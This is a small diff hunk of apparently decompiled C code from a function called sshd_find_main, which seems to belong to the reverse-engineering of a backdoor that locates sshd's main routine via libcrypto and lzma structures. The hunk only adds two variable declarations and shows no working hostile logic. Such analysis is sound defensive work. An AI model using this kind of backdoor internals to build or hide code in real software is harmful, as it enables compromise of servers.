@@ -35,11 +35,13 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
   u8 *puVar11;
   u8 *puVar12;
   byte bVar13;
+  dasm_ctx_t insn_ctx;
   lzma_allocator *allocator;
   u8 *code_segment_start;
   u8 *code_segment_end;
   u8 *libc_start_main_got;
   u8 *sshd_main_candidate;
+  u64 code_segment_size;
   u64 local_88;
   dasm_ctx_t local_80;
   
